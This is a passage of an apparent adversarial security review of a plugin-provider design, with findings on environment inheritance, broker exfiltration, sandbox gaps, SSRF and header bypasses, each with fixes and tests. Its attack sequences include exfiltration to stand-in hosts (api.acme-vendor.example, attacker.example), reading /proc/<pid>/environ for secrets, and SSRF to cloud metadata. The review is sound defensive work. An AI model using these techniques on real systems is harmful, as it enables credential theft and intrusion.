#### ADV-027 — Lane 6 - provider inherits the full host environment

- **Severity:** HIGH _(reported as BLOCKER; adjudicated down by the verification pass)_  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 foundation (host lifecycle); blocks the credential-handle deliverable and the P1 exit gate on secret non-exposure
- **Verification:** CONFIRMED — HIGH (down from BLOCKER/HIGH ambiguity): the defect is real and violates stated invariants, but the remediation is localized and additive — env allowlist at spawn, --clearenv on bwrap, Ed25519-v2-only for providers — not a protocol/trust-model redesign; per the brief's ladder (line 834-835) that is HIGH, provided it is made a hard P1 precondition for the first provider phase and for production admission.
  - Verifier reasoning: Every load-bearing evidence cite checks out under independent inspection. core/agents/manager/loader.go:722 sets cmd.Env = os.Environ() and then appends CODEFLY_AGENT_TOKEN (line 780), CODEFLY_PRINCIPAL_TOKEN (line 800), and the base64url-encoded symmetric CODEFLY_SCOPED_AUTHZ_SECRET (line 814); the struct doc (line 295) and comment (line 384) confirm parent-env inheritance is intentional in the current loader. Neither sandbox backend filters the environment: bwrap buildArgs emits no --clearenv or --unsetenv (and also no --unshare-pid, so same-UID /proc/<pid>/environ reads inside the sandbox are real), sandboxexec.Wrap only rewrites Path/Args, and the Sandbox interface contract in sandbox.go explicitly documents that Env is preserved. The proposal's contradicted claims exist as cited: control 7 'Secret minimization' (provider-plugins.md:1403; finder said 1399, a trivial offset), 'opaque credential handles ... not raw credential values' (line 865), and brief invariant 13 'Provider agents do not get secret-store credentials' verbatim (brief line 501). Reachability holds because the proposal explicitly routes provider spawning through this exact manager path (reuse table at provider-plugins.md:347-354, including manager.WithScopedAuthSecret 'Reuse the per-spawn v1 verifier locally', and line 110 mandating reuse of agent distribution/UDS/sandbox), and an exhaustive search of the proposal finds no control addressing spawn-environment inheritance — controls 4-6 cover UDS auth, filesystem/network, and the HTTP broker only. The ambient-secret premise is realistic: module-saas-starter/scripts/setup/stripe.sh:21 reads STRIPE_API_KEY from the environment (finder wrote STRIPE_SECRET_KEY — minor naming slip, substance holds) and the github/linear toolboxes read GITHUB_TOKEN/LINEAR_API_KEY from env. The v1 scoped-auth claim also holds: the shared HMAC secret is both verification and signing key, so a provider holding it can forge scoped authorizations; the proposal itself (line 352) only defers Ed25519 v2 to 'when host/plugin separation requires public verification'. Minor mitigations (network-deny sandbox narrows direct exfiltration) do not refute the finding, since possession alone violates invariant 13 and the broker provides egress to approved vendor origins.
  - Verifier evidence: core/agents/manager/loader.go:722 (cmd.Env = os.Environ()), :780/:800/:814 (token/principal/HMAC-secret env appends), :295/:384 (documented inheritance); core/runners/sandbox/bwrap.go buildArgs (no --clearenv, no --unshare-pid); core/runners/sandbox/sandboxexec.go:66-82 (Wrap does not touch Env); core/runners/sandbox/sandbox.go Wrap contract ('Env ... are preserved'); core/docs/provider-plugins.md:865 (opaque handles), :1403 (secret minimization control), :347-354 and :110 (providers reuse manager spawn path and v1 scoped-auth secret); core/docs/provider-plugins-adversarial-review-brief.md:501 (invariant 13), :834-835 (severity ladder); module-saas-starter/scripts/setup/stripe.sh:21 (STRIPE_API_KEY from env); core/toolbox/github/server.go and core/toolbox/linear/server.go (env-carried credentials)
- **Claim challenged:** Control #7 'Secret minimization: resolve only the named credential required for one operation' (line 1399), invariant 13 'Provider agents do not get secret-store credentials', and the premise that 'the provider receives opaque credential handles for brokered requests, not raw credential values' (line 866).
- **Evidence:** core/agents/manager/loader.go:722 sets cmd.Env = os.Environ() (full parent environment) before appending CODEFLY_* values (loader.go:723-760, 777, 800-806, 817, 836). bwrap builds no --clearenv (core/runners/sandbox/bwrap.go:107-138) and sandbox-exec does not filter env (sandboxexec.go:66-82); core/runners/sandbox/sandbox.go:76-80 documents that Wrap preserves cmd.Env. Existing in-process toolboxes already pass credentials by env (core/toolbox/github/server.go, core/toolbox/linear/server.go).
- **Failure or attack sequence:** A developer runs 'codefly provider setup billing --env local-dogfood' from a shell exporting OP_SERVICE_ACCOUNT_TOKEN (or Vault/AWS/GitHub tokens, or STRIPE_SECRET_KEY from the old script workflow). The provider process starts with all of them - no handle, no policy decision, no receipt. It also receives CODEFLY_AGENT_TOKEN, CODEFLY_PRINCIPAL_TOKEN and CODEFLY_SCOPED_AUTHZ_SECRET (loader.go:777, 800-806, 817), i.e. the per-spawn HMAC key of the v1 scoped-authorization path. On Linux it can additionally read /proc/<other-pid>/environ of same-UID processes.
- **Impact:** The most powerful credentials on the developer's machine - including the secret-store credentials invariant 13 forbids - are handed to every provider binary at spawn, bypassing the whole handle/broker/purpose-separation architecture, and the provider holds the symmetric signing key used for scoped authorization.
- **Required change:** Build cmd.Env for provider spawns from a fixed allowlist (PATH, HOME or a per-spawn HOME, TMPDIR, locale, TZ, plus required CODEFLY_* values) instead of os.Environ(); pass --clearenv on bwrap; document that no host secret may reach a provider via environment. Restrict providers to the Ed25519 v2 scoped-authorization format so no symmetric signing key is shared with an untrusted binary. P1 deliverable and a provider production-admission precondition.
- **Acceptance test:** Conformance test: spawn a provider with OP_SERVICE_ACCOUNT_TOKEN=canary, AWS_SECRET_ACCESS_KEY=canary, STRIPE_SECRET_KEY=canary in the parent environment; the fixture returns its own environ; assert no canary appears, that only the documented allowlist is present, and that CODEFLY_SCOPED_AUTHZ_SECRET is absent.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-028 — Lanes 6+7 - exfiltration through the broker's own allowlisted origin

- **Severity:** HIGH _(reported as BLOCKER; adjudicated down by the verification pass)_  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P0 threat model; P1 broker request-descriptor schema (body field ceilings are a protocol shape decision that is expensive to retrofit)
- **Verification:** CONFIRMED — Downgrade to HIGH: the gap is real and must be closed before the provider manifest/request-descriptor protocol is frozen in P1 (item (a) changes protocol shape, so it belongs in the P0 decision set) and before any third-party provider is admitted, but v1 ships only three in-repo codefly.dev providers, the remedies are additive rather than a breaking redesign, and on a genuine first-party origin the channel is much narrower — so "implementation must not start" overstates it.
  - Verifier reasoning: I re-derived every citation and could not refute the mechanism.

(1) Evidence holds, with trivial line drift. Proposal lines 2326-2331 do contain exactly the quoted rejected-alternative rationale, and 658-661 the "safer than giving every third-party provider binary `network: open` plus raw bearer tokens" claim. `api-origins:` at 707-708 comes from the provider's own packaged `provider.codefly.yaml` (690-746: "the reviewable maximum capability declaration ... packaged with the release"), and control #1 at 1393 confirms the manifest is the ceiling — i.e. the origin ceiling is author-declared, not host- or operator-classified. The manifest example (695-742) declares origins, permissions, sandbox, projections, resource-types, and (500-514) secret-capture pointers, but no request-body schema anywhere. The broker requirement list is at 1424-1445; the two items the finder quotes are on 1435 ("request and response body classification") and 1436 ("smaller default body caps"), not 1438-1439 — a 3-line offset, no substantive change. The threat model (1379-1389) lists a compromised provider binary, malicious responses, malicious local paths, broad credentials, etc., but never "an allowlisted origin may be adversary-controlled". Deferral citations hold: 1998 "decide artifact digest lock timing" (P0 decides only *timing*), 2155 "agent artifact digest lock" in P5; 1396-1397 says digests only "before general availability". Codefly source claims hold exactly: `core/runners/sandbox/sandboxexec.go:101` emits `(allow default)` with only `.ssh/.aws/.config/codefly/secrets/.gnupg` denied (119-124), and 161-170 states readPaths are "advisory on macOS ... no-op rule" — so the manifest's `read_paths: []` (731) buys nothing on macOS; `core/agents/manager/loader.go:722` is `cmd.Env = os.Environ()` (full parent env inherited, caller env only appended). Vendor claim verified by WebFetch of docs.stripe.com/api/webhook_endpoints/create: writable `description` (string), `metadata` (map), and `url` (string) — free-text bodies exist even on a first-party origin.

(2) Reachability: nothing in the proposal blocks the sequence. The strongest candidate defenses all pass under the attack: origin allowlist (self-declared), "allowed method and path templates" bound into the credential handle (476) and re-checked at "Broker execution" (440-442: "the exact origin, method, path template, credential purpose, and idempotency identity" — body explicitly not checked), size/time caps (651), redirect denial (1441). The intersection formula (322-334) constrains the *principal's* authority and the action/resource pair, not the trustworthiness of the destination. Publisher is a free field (674, 683, 701) and resolution is local/Nix/OCI/GitHub (686), with no publisher-trust or review gate; the non-goals (116-135) do not exclude third-party providers, and the doc explicitly frames itself as the public third-party model (299, 658, 2310) with "provider author guide and scaffold command" as a P5 deliverable (2161). A weaker but earlier variant is also reachable with a first-party origin: because the broker never validates request bodies against the approved plan (only a `RequestDigest` at dispatch, 452, and origin/method/path at execution), a compromised provider can stuff bytes into Stripe `description`/`metadata`, or into the webhook `url` field even though the host resolved the callback origin (1332-1342) — the host resolves the endpoint but never asserts that the body's URL equals what it resolved.

(3) Fairness check on the "overstated" charge — partially rebutted, not enough to refute the finding. The literal text of 2328-2331 claims only that host-mediated HTTP moves enforcement of origin/method/credential/timeout/redaction/cassette to the trusted boundary, which is true, and the open-decision text at 2264-2266 is hedged ("materially reduces credential and egress authority"). So "the proposal's core security argument is overstated" is a stretch as applied to those sentences. What is genuinely missing is what the finding's required change asks for: the threat model does not state that an allowlisted origin can be hostile, there is no request-body ceiling, no per-origin egress accounting in receipts (1140-1200 receipt/state contents list digests and identities, no request counts or byte totals), and signing/digest pinning plus read/env confinement are deferred or broken. The brief's own stance items ("Treat compromised provider code as an expected threat case", "Look for places where documentation promises more than Codefly can enforce", 851-863) make this in-scope rather than hypothetical.
  - Verifier evidence: core/docs/provider-plugins.md:2326-2331 (rejected-alternative rationale), :658-661, :690-746 + :707-708 (author-packaged manifest is the origin ceiling; no body schema), :731 `read_paths: []`, :440-442 (broker re-check covers origin/method/path template only), :465-484 (:476 "allowed method and path templates"), :1379-1389 (threat model omits hostile allowlisted origin), :1435-1436 (body classification / smaller body caps only), :1393-1397 + :1998 + :2155 (digest lock deferred to P5), :2161 (third-party author guide in P5), :116-135 (non-goals do not exclude third-party providers); core/runners/sandbox/sandboxexec.go:101 `(allow default)`, :119-124 (only 4 secret roots denied), :161-170 ("readPaths are advisory on macOS ... no-op rule"); core/agents/manager/loader.go:722 `cmd.Env = os.Environ()`; WebFetch https://docs.stripe.com/api/webhook_endpoints/create — writable `url`, `description` (string), `metadata` (map); brief provider-plugins-adversarial-review-brief.md:834-836 (severity rubric), :851-863 (compromised provider is an expected threat case).
- **Claim challenged:** Proposal's rejected-alternative rationale: 'A compromised plugin could exfiltrate every credential despite application-layer origin checks. Host-mediated HTTP makes the trusted Codefly boundary enforce origin, method, credential, timeout, redaction, and cassette policy' (lines 2326-2331), and 'This is safer than giving every third-party provider binary network: open plus raw bearer tokens' (lines 659-661).
- **Evidence:** The broker's origin ceiling derives from the provider's own packaged manifest (lines 707-708, 1393); for a third-party provider that origin is the plugin author's own service. The manifest constrains no request bodies (lines 695-742); the requirements mention 'request and response body classification' and 'smaller default body caps' (1438-1439) but no body schema ceiling. Combined with unconfined macOS reads (sandboxexec.go:100-124) and full env inheritance (loader.go:722), the provider has both the data and a host-blessed egress path. Even first-party APIs offer writable free-text fields (POST /v1/webhook_endpoints and POST /v1/webhook_endpoints/:id, docs.stripe.com/api/webhook_endpoints).
- **Failure or attack sequence:** A malicious 'codefly.dev/acme:0.1.0' provider declares api-origins: [https://api.acme-vendor.example], a host its author controls. Observe issues GET https://api.acme-vendor.example/v1/account?d=<base64 of stolen bytes> or POSTs the bytes in a body. Every broker control passes: allowlisted origin, declared method, correct credential handle, sizes within caps. The host has faithfully proxied an exfiltration.
- **Impact:** Host-mediated egress reduces credential-theft authority but gives no exfiltration protection, because the allowlisted origin belongs to the potentially hostile party. The proposal's core security argument for the broker is overstated, and the controls that would actually matter (artifact signing/pinning, read confinement, env minimization, body ceilings, egress accounting) are deferred to P5 (lines 1996-1998, 2155) or absent.
- **Required change:** State in the threat model that an allowlisted origin may be adversary-controlled, and add: (a) per-operation request-body ceilings - declared field names/schema plus a small byte cap, rejecting undeclared fields rather than only capping size; (b) egress accounting in receipts (request count and total bytes per origin per operation) so exfiltration is attributable; (c) publisher signature plus pinned artifact digest required for any provider not published by codefly.dev, moved out of P5 into the third-party admission precondition; (d) fix read confinement and env minimization, which determine what is available to exfiltrate.
- **Acceptance test:** Conformance test with a hostile fixture provider whose manifest allowlists a local recorder origin: the fixture sends an undeclared body field and an over-long declared field; both are rejected before transmission, and the receipt records per-origin request count and byte totals.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-029 — Lane 6 - no host-side ceiling on sandbox capacity; production admission accepts network: open

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 foundation (manifest parser, production admission); required before any third-party provider is installable
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Invariant 11 'Provider agents do not get unrestricted external network', control #2 'catalog match' as if it covered capacity, and the effective-decision term 'intersection process sandbox permits the underlying system operation' (line 334).
- **Evidence:** Capacity comes from the plugin's manifest and is applied verbatim: core/resources/toolbox.go:65-71, core/policy/permissions.go:174-206 (including 'case NetworkOpen: sb.WithNetwork(sandbox.NetworkOpen)'), core/toolbox/launch/launch.go:199-235 (only an unset network defaults to loopback, lines 212-214). Production admission checks only a non-native backend (core/agents/manager/loader.go:611-615) and a non-empty policy plus one declared permission (core/resources/toolbox.go:186-197). Nothing rejects NetworkOpen anywhere in core. Proof: toolbox-web declares network: open (toolbox-web/toolbox.codefly.yaml:26) and toolbox-web/manifest_test.go:13-17 asserts that manifest passes ValidateForProduction(). Also core/toolbox/launch/launch.go:240-247 comments about a 'CODEFLY_SANDBOX_PERMISSIVE=1 escape hatch' that does not exist in the repo, while isEmptyPolicy (launch.go:199-206) really does yield WithoutSandbox.
- **Failure or attack sequence:** A provider ships a manifest with 'sandbox: {network: open}' plus one declared permission. Every admission check passes, including WithProductionAdmission. The provider then has unrestricted egress and bypasses the broker entirely: it holds no raw vendor credential but can exfiltrate everything it can read and fetch second-stage payloads.
- **Impact:** 'Providers do not get unrestricted external network' is unenforceable today: it is a request to the manifest author, who is the untrusted party, making every downstream broker control optional from the provider's point of view.
- **Required change:** Add a host-owned maximum capacity per agent kind enforced before spawn and independent of the manifest: for codefly:provider, network must be loopback or deny (reject open with a named error), write_paths empty except the per-spawn UDS directory, read_paths empty. Enforce next to validateProductionAdmission (loader.go:609-632) and lint it in 'codefly agent ci'. Separately fix the false CODEFLY_SANDBOX_PERMISSIVE comment and make 'no enforcing backend' a hard failure for providers rather than a native fallback.
- **Acceptance test:** Unit tests: a provider manifest with network: open is rejected at load with a distinct error; write_paths outside the per-spawn socket dir is rejected; on a host with no enforcing backend, provider load fails rather than running unconfined; and the current toolbox-web manifest would NOT be admissible as a provider.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-030 — Lane 6 - sandbox and UDS reuse is toolbox-only (PARTIAL/UNWIRED)

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 foundation (provider supervisor/session, production admission gates)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Reuse rows 'authenticated plugin transport | agent manager | private UDS, per-spawn bearer, process supervision' and 'plugin sandbox and PDP | policy, agent manager' with only a 'provider-specific session/client' extension (lines 246-247), plus controls #4/#5 (1395-1397).
- **Evidence:** Every non-toolbox load path opts out of confinement: core/services/agent.go:141-148 ('Explicit WithoutSandbox: service agents (Runtime, Builder, Code)'), cli/pkg/engine/supervisor.go:142, core/sdk/sdk.go:162-168. The only sandboxed launcher is core/toolbox/launch/launch.go:140-152 and the only production-admission path is the toolbox session. UDS is opt-in: useUDS defaults false (core/agents/manager/loader.go:297), WithUDS (line 416) has one non-test caller (core/toolbox/session/session.go:276), and UDS setup is gated on cfg.useUDS (loader.go:745-746) - otherwise the handshake is TCP loopback. On Linux both NetworkDeny and NetworkLoopback pass --unshare-net (core/runners/sandbox/bwrap.go:134-136), creating a fresh namespace, so a host-to-plugin TCP loopback handshake cannot work; only the --bind-try'd UDS path is reachable.
- **Failure or attack sequence:** A provider host written by analogy with cli/pkg/engine/supervisor.go or core/services/agent.go inherits WithoutSandbox and TCP loopback: either the provider runs unconfined (a legal option today), or, if the author copies the toolbox sandbox but omits WithUDS, load fails on Linux with an opaque handshake timeout while appearing to work on macOS.
- **Impact:** 'Reuse the existing sandbox and authenticated transport' understates the work and hides a platform-specific correctness trap; these rows are PARTIAL/UNWIRED, not REUSE AS-IS.
- **Required change:** Rewrite both rows as PARTIAL/UNWIRED with the extension 'a provider session analogous to core/toolbox/session that mandates WithUDS, WithSandbox under the host-imposed provider ceiling, WithPrincipal, WithPermissionsCallback and WithProductionAdmission, with WithoutSandbox/WithoutPrincipal unreachable for providers'. Require UDS unconditionally for providers (no TCP fallback) and state that Windows providers are unsupported (loader.go:745 disables UDS on Windows; core/runners/sandbox/sandbox.go:94-103 returns native there).
- **Acceptance test:** Provider conformance asserting: the load used a unix: endpoint; backend is bwrap or sandboxexec (never native); principal, PDP callback and scoped authorization all present; and that omitting any one of them fails before the process is spawned. Run on both Linux and macOS.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-031 — Lane 6 - Linux bwrap omits PID/IPC isolation while mounting host /proc

- **Severity:** HIGH  **Confidence:** MEDIUM  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 foundation (sandbox hardening); required before third-party providers and before production admission
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** Invariant 13 and control #7 (secret minimization), and 'no direct secret-store access' (line 643).
- **Evidence:** core/runners/sandbox/bwrap.go:107-138 builds --die-with-parent, --new-session, --proc /proc, --dev /dev, --tmpfs /tmp, ro-binds of /usr,/lib,/lib64,/bin,/sbin,/etc, declared binds, and --unshare-net for deny/loopback. There is no --unshare-pid, --unshare-ipc, --unshare-uts, --unshare-user, --clearenv or seccomp filter. With a shared PID namespace the mounted /proc exposes same-UID host processes, and /proc/<pid>/environ is readable by the owning UID. Confidence MEDIUM because environ readability and ptrace availability depend on host hardening (yama ptrace_scope, hidepid) not exercised in this review.
- **Failure or attack sequence:** On Linux a provider enumerates /proc, finds the codefly CLI and same-user application services, and reads /proc/<pid>/environ and cmdline - recovering STRIPE_API_KEY, DATABASE_URL, OP_SERVICE_ACCOUNT_TOKEN, CODEFLY_AGENT_TOKEN and CODEFLY_SCOPED_AUTHZ_SECRET from processes it was never granted. It can also signal those processes (denial of service against a mid-flight Apply) and, where ptrace_scope permits, attach to them.
- **Impact:** Even after environment minimization for the provider's own process, Linux confinement leaks every same-UID process's secrets, so the credential-handle boundary is bypassable on the platform whose filesystem confinement is otherwise strongest.
- **Required change:** Add --unshare-pid, --unshare-ipc, --unshare-uts and --clearenv for provider spawns (with --unshare-pid the payload becomes PID 1 in the namespace; keep --die-with-parent), and consider --unshare-user plus a seccomp profile. Add a Linux test proving the sandboxed process cannot see a sibling PID in /proc. Document confinement per OS instead of one OS-agnostic claim.
- **Acceptance test:** Linux sandbox_e2e: parent exports CANARY=secret and stays alive; the sandboxed fixture attempts to read /proc/<parent-pid>/environ and kill(parent-pid, 0). Both must fail, and the fixture must see only its own PID in /proc.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-032 — Lane 7 - toolbox-web is not reusable enforcement; the broker is new host-side code

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 foundation (broker); affects P1 sizing and the exit gate on unapproved-origin unreachability
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** 'The Web toolbox already enforces exact hostname matching, redirect revalidation, HTTP(S)-only URLs, timeouts, and response caps. Extract or reuse those primitives' (1424-1426); reuse row 'Web toolbox | toolbox-web | exact-host allowlist, redirect checks, timeouts, response caps' (line 255); 'The existing Web toolbox supplies most of the HTTP guard behavior' (line 660).
- **Evidence:** The entire guard lives in the plugin process: host check at toolbox-web/server.go:200-210, CheckRedirect closure at 76-85, LimitReader at 251-260, client at line 76 with a nil Transport. The allowlist is passed to the plugin through its own env var (toolbox-web/cmd/toolbox-web/main.go:22-24) and the manifest grants network: open (toolbox.codefly.yaml:26), honored verbatim by core (core/policy/permissions.go:202-203). Core has no host-side HTTP guard. None of the broker's required features exist: no header allowlist (server.go:234-240 sets caller headers verbatim), no credential injection, no proxy pinning, no DNS/IP pinning, no TLS/CA policy, no idempotency-key injection, no rate-limit normalization, no request-ID extraction, no secret capture, no cassettes (searching core/ and cli/ for 'cassette' returns docs only). Dependency direction already favors core: toolbox-web requires core v0.2.23 (toolbox-web/go.mod:8); core does not depend on toolbox-web.
- **Failure or attack sequence:** An implementer treats the broker as an extraction, budgets a small refactor and inherits toolbox-web semantics: caller-controlled headers (so provider-supplied Authorization/Accept-Encoding pass), truncation instead of fail-closed, environment proxy, no IP pinning, and http:// permitted (server.go:204-206), which would send an injected bearer token in cleartext.
- **Impact:** The most security-critical new component is scoped as reuse when it is essentially new code, understating P1 effort and importing the wrong defaults. It also leaves toolbox-web itself misdescribed as a boundary when its allowlist is advisory.
- **Required change:** Reclassify the row as NEW (host-side broker in core, e.g. core/net/brokerguard plus core/provider/broker) with toolbox-web as prior art only. Implement in core so direction stays core <- toolbox-web, then re-point toolbox-web at the shared guard - ideally making toolbox-web descriptor-only with host-executed fetch so its network: open grant can be dropped. State in the proposal that an in-process allowlist inside a process with raw egress is not an enforcement mechanism.
- **Acceptance test:** Core broker suite covering https-only (http rejected unless declared loopback), header allowlist, URL-userinfo rejection, proxy pinning, DNS/IP pinning, fail-closed size caps, no-redirect-with-credentials, credential injection by handle and one-time capture - with a test proving no provider-supplied value can change origin, method, path, credential or Accept-Encoding.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-033 — Lane 7 - request authorization cannot be derived from origin+method+path alone

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P1 (manifest schema, broker request descriptor, plan action shape); freezing v0 without this forces a breaking redesign
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** 'Broker execution: before every outbound request, re-check that the action/resource is in the approved plan and authorize the exact origin, method, path template, credential purpose, and idempotency identity' (442-444) and 'allowed method/path patterns from the provider manifest' (line 1437).
- **Evidence:** The normative manifest (695-742) declares only api-origins, permissions with resource prefix provider:stripe/*, sandbox, projections and resource-types - no method/path/query/body constraints, so the ceiling line 1437 assumes does not exist (internal contradiction). Vendor shape confirms insufficiency: Stripe update is POST /v1/webhook_endpoints/:id and delete is DELETE /v1/webhook_endpoints/:id (docs.stripe.com/api/webhook_endpoints), so operations differ only by :id presence/value and destructive semantics live in the form body (replacing enabled_events, disabling an endpoint); Sentry 'sometimes' passes parameters via querystring even for POST/PUT/DELETE (docs.sentry.io/api/requests/). The proposal's resource syntax already contains the remote ID (line 414) but nothing requires the broker to extract and compare it.
- **Failure or attack sequence:** An approved plan contains one action: provider.update on provider:stripe/ws/local-dogfood/billing/stripe.webhook-endpoint/we_APPROVED. The provider issues POST https://api.stripe.com/v1/webhook_endpoints/we_PRODUCTION_CRITICAL with url=https://attacker.example/hook. Origin, method, path template and credential purpose all match and the action name is provider.update - every enumerated check passes while an unplanned resource is mutated. Variant: with only provider.observe ('low risk', line 393) the provider issues unbounded GET /v1/customers, /v1/invoices, /v1/charges and reads payment PII.
- **Impact:** One approved action becomes ambient CRUD over every resource of that type in the account, and read-only observation becomes unbounded account-wide data access with a management key - the exact 'one broad grant yields ambient remote CRUD' failure.
- **Required change:** (1) Add method/path-template/query/body-field declarations to the provider manifest schema and derive the broker ceiling from them, rejecting non-matching requests. (2) Require the broker to parse the concrete request and extract path/query resource identifiers itself, comparing them to the approved plan action's remote ID and never trusting provider-supplied action/resource claims. (3) Bind observe to declared read templates plus a per-operation request budget and reclassify Stripe observe as medium risk. (4) Have each plan action declare how many broker requests it may issue and enforce that count.
- **Acceptance test:** Broker tests: (a) approved update for we_A then a request to we_B is denied with resource-mismatch and nothing leaves the process; (b) a GET to an undeclared path on an allowlisted origin is denied; (c) exceeding a plan action's request budget is denied; (d) a provider-supplied action/resource claim contradicting the derived one is denied and logged.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-034 — Lane 7 - operator-supplied origins versus the manifest ceiling; broker SSRF from the trusted host

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** yes  **Affected phase/issues:** P1 (manifest origin schema, broker dial policy); P3 Sentry cannot be accepted without it
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** The manifest api-origins list is an exact ceiling (707-708, control #1 line 1393) while providers accept an 'API base or regional origin' as input (Sentry line 1673; STRIPE_API_BASE line 860) and Sentry regional/self-hosted origins are a first-class design case (lines 33, 1926).
- **Evidence:** Sentry publishes region-specific API hosts us.sentry.io and de.sentry.io (docs.sentry.io/api/) and self-hosted installs use operator-chosen hosts (that page documents only cloud regions, so self-hosted bases are unknown at packaging time). The proposal never says whether the packaged manifest, GetProviderInformation or the binding input wins, asserting both 'exact allowed API origins' validated against the manifest (1096, 1393) and operator-supplied bases. The broker runs in the unsandboxed CLI host process (host-side agent paths are unconfined: core/services/agent.go:148, cli/pkg/engine/supervisor.go:142), and the precedent performs no DNS/IP validation - only a hostname string check, then Go dials by name (toolbox-web/server.go:200-210).
- **Failure or attack sequence:** Path A (ceiling erosion): supporting self-hosted Sentry requires a manifest wildcard or a binding-level origin; a wildcard makes control #1 vacuous and lets a compromised Sentry provider send the setup token anywhere. Path B (SSRF): an operator or workspace-committed input sets SENTRY_API_BASE=https://sentry.internal.example resolving to 127.0.0.1, 169.254.169.254 or a VPN-reachable RFC1918 address; the broker issues requests from the trusted host, reaching loopback admin interfaces, cloud instance metadata or internal services. Path C (DNS rebinding): the hostname is validated once and re-resolved at dial time, so a hostile origin answers validation with a public IP and the dial with 169.254.169.254.
- **Impact:** Either the origin ceiling is meaningless for the provider chosen specifically to pressure the abstraction, or the broker becomes a general-purpose SSRF primitive with the host's full network position.
- **Required change:** Specify origin resolution: the manifest declares origin patterns by class plus an explicit self-hosted capability; a self-hosted or regional origin must come from the environment binding, be admitted as its own policy action with approval, and be included in the plan digest. The broker must require https except for explicitly declared loopback; reject URL userinfo and IP-literal hosts unless declared; resolve once and pin the resolved IP for the connection via a custom DialContext; reject loopback/link-local/RFC1918/ULA/CGNAT/multicast/metadata addresses unless the binding declares a private origin; and support an operator-declared per-origin CA bundle with no system-trust fallback for self-hosted origins and never InsecureSkipVerify.
- **Acceptance test:** Broker tests: (a) a declared origin resolving to 127.0.0.1/169.254.169.254/10.0.0.0/8 is refused unless the binding declares a private origin; (b) validation-time versus dial-time resolution mismatch fails the request; (c) http:// with a credential handle is refused; (d) a URL with userinfo is refused; (e) a self-hosted origin absent from the approved plan digest invalidates approval.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-035 — Lane 7 - header policy must be an allowlist; URL userinfo and Accept-Encoding are bypasses

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 broker; blocks the P1 one-time-capture deliverable and the P2 Stripe signing-secret path
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** The broker 'rejects caller-supplied authorization, cookie, and proxy headers' (1434-1436) and invariant 17 'A provider cannot add its own authorization header or change the credential's approved origin'.
- **Evidence:** (1) Go converts URL userinfo into an Authorization header when none is set: 'if u := req.URL.User; u != nil && req.Header.Get("Authorization") == "" { ... req.Header.Set("Authorization", "Basic "+basicAuth(username, password)) }' (GOROOT/src/net/http/client.go:251-257, Go 1.26.5), so a header-name denylist does not close the channel. (2) Go does not decompress a body the caller asked for: 'If the Transport requests gzip on its own and gets a gzipped response, it's transparently decoded in the Response.Body. However, if the user explicitly requested gzip it is not automatically uncompressed' (GOROOT/src/net/http/transport.go:195-202). (3) The precedent sets every caller-supplied header verbatim with no filtering (toolbox-web/server.go:234-240). (4) The proposal wants host-injected idempotency keys (line 1441), which must therefore not be provider-settable.
- **Failure or attack sequence:** A provider sets Accept-Encoding: gzip on the webhook-create request. The vendor returns gzip-compressed JSON containing the one-time signing secret: either JSON-Pointer capture silently fails to match and the raw secret-bearing body is returned to the provider (defeating invariant 18 and the capture design), or the request errors after the mutation already succeeded, leaving an endpoint whose only copy of the signing secret is unrecoverable. The same header breaks body-cap accounting (4 MiB compressed can inflate to hundreds of MiB). Separately, a userinfo-bearing URL gives the provider its own auth channel on uncredentialed requests plus a host-parsing confusion vector, and a provider-set Idempotency-Key can replay or diverge from the host's idempotency identity.
- **Impact:** Three independent bypasses of the broker's load-bearing promises (no provider-chosen credentials, one-time secrets never reach the provider, bounded responses), all reachable with a syntactically valid request descriptor.
- **Required change:** Replace the denylist with a strict per-operation allowlist of provider-settable headers (e.g. Content-Type, Stripe-Version, Accept); everything else host-owned or rejected. The host owns Accept-Encoding (identity, or one algorithm the broker inflates itself under an expansion-ratio cap), Authorization, Cookie, Host, Idempotency-Key, Proxy-*, X-Forwarded-*, Transfer-Encoding, Expect and Content-Length. Reject any URL containing userinfo; normalize and validate the URL (no non-http(s), no fragments, no encoded-slash traversal) and reconstruct the request from parsed components rather than replaying the provider's raw string.
- **Acceptance test:** Broker tests: provider-supplied Authorization, Cookie, Proxy-Authorization, Accept-Encoding, Idempotency-Key and Host are each rejected (not silently dropped); a URL with userinfo is rejected; a gzip-encoded response to a capture-declared request is inflated under a ratio cap and captured correctly; a body that cannot be parsed as declared JSON fails the request without returning the raw body to the provider.
- **Lane/reviewer:** Lanes 6, 7

#### ADV-036 — Lane 7 - proxy environment variables silently redirect credentialed traffic

- **Severity:** HIGH  **Confidence:** HIGH  **Protocol-breaking if deferred:** no  **Affected phase/issues:** P1 broker; P2 Stripe (first credential injection)
- **Verification:** not independently verified (outside the verification budget)
- **Claim challenged:** The broker enforces 'exact origins' (654, 1428-1430) and rejects caller-supplied proxy headers (1435), presented as sufficient egress control.
